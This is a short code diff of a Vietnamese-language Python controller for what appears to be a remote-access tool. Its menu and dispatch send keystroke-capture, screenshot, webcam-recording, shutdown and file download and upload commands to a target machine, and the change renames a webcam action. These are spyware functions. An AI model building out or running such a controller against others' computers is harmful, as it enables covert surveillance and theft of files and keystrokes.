@@ -52,7 +52,7 @@ Chọn chức năng (theo hình):
  3) Keystroke           (bắt phím: start/stop/dump)
  4) Tắt máy             (shutdown)
  5) Chụp màn hình       (screenshot)
- 6) Webcam capture      (ảnh webcam)
+ 6) Webcam open         (mở webcam)
  7) Webcam record       (video webcam)
  8) Download file       (tải file từ máy đích)
  9) Upload file         (gửi file lên máy đích)
@@ -98,8 +98,8 @@ def main():
                     send_message(conn, {"action": "shutdown"})
                 elif choice == "5":  # Chụp màn hình
                     send_message(conn, {"action": "screenshot"})
-                elif choice == "6":  # Webcam capture
-                    send_message(conn, {"action": "webcam_capture"})
+                elif choice == "6":  # Webcam open
+                    send_message(conn, {"action": "webcam_open"})
                 elif choice == "7":  # Webcam record
                     seconds = int(input("Ghi video mấy giây (mặc định 5): ") or "5")
                     send_message(conn, {"action": "webcam_record", "seconds": seconds})
